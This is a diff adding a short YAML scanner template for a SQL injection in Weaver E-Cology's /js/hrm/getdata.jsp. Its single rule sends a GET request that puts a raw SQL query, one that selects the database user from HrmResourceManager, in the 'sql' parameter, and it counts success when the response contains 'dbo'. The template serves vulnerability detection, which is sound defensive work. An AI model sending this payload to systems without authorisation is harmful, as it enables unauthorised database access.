@@ -1,0 +1,11 @@
+name: 泛微E-Cology-getdata-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20user%20as%20id%20from%20HrmResourceManager
+    expression:
+      status: 200
+      body_all: ["dbo"]    
